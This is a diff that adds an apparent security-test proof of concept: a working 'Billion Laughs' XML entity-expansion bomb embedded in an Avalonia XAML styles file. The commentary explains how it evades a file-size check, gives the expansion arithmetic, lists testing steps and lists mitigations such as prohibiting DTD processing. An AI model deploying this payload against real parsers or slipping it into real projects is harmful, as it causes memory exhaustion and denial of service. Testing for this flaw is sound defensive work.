@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- 
+    PROOF OF CONCEPT: Billion Laughs Attack (XML Bomb)
+    DO NOT USE IN PRODUCTION
+    
+    This file demonstrates CYC-2026-020: XML Entity Expansion
+    
+    File size on disk: ~2 KB
+    Size after entity expansion: ~1 GB
+    
+    Expected behavior:
+    - File size check (CYC-2026-004) passes (file is only 2KB on disk)
+    - Parser attempts to expand entities
+    - Memory allocation explodes
+    - OutOfMemoryException or system instability
+-->
+
+<!DOCTYPE lolz [
+  <!-- Define a base entity -->
+  <!ENTITY lol "lol">
+  
+  <!-- Each level multiplies by 10 -->
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+  
+  <!-- lol9 expands to 10^9 "lol" strings = ~3GB of text -->
+]>
+
+<Styles xmlns="https://github.com/avaloniaui">
+    <!-- This looks like a normal style -->
+    <Style Selector="Button">
+        <!-- But this property value triggers the expansion -->
+        <Setter Property="Content" Value="&lol9;" />
+        
+        <!-- Alternative: Multiple expansions for guaranteed crash -->
+        <Setter Property="ToolTip" Value="&lol9;" />
+    </Style>
+    
+    <!-- You could also hide the bomb in comments -->
+    <!-- Payload: &lol9; -->
+    
+    <!-- Or in attribute values -->
+    <Style Selector="TextBlock" x:Name="&lol9;">
+        <Setter Property="Text" Value="Normal text" />
+    </Style>
+</Styles>
+
+<!-- 
+    EXPANSION MATH:
+    
+    lol   = "lol"                    = 3 bytes
+    lol1  = lol × 10                 = 30 bytes
+    lol2  = lol1 × 10                = 300 bytes
+    lol3  = lol2 × 10                = 3 KB
+    lol4  = lol3 × 10                = 30 KB
+    lol5  = lol4 × 10                = 300 KB
+    lol6  = lol5 × 10                = 3 MB
+    lol7  = lol6 × 10                = 30 MB
+    lol8  = lol7 × 10                = 300 MB
+    lol9  = lol8 × 10                = 3 GB
+    
+    Two lol9 references (Content + ToolTip) = 6 GB allocation
+    
+    Modern systems will crash before this completes.
+-->
+
+<!-- 
+    HOW TO TEST SAFELY:
+    
+    1. Test in a VM or container with memory limits
+    2. Monitor memory usage: Task Manager or `dotnet-counters`
+    3. Start with lol3 or lol4 (smaller expansions)
+    4. Gradually increase to lol9
+    
+    WHAT TO OBSERVE:
+    
+    - Does file size check catch this? (No - file is small on disk)
+    - Does Avalonia's XAML parser expand entities?
+    - Does memory usage spike during parse?
+    - Does application crash with OutOfMemoryException?
+    - Does system become unresponsive?
+    
+    MITIGATION:
+    
+    - Disable DTD processing entirely
+    - Set XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit
+    - Set XmlReaderSettings.MaxCharactersInDocument limit
+    - Reject files with DOCTYPE declarations
+-->
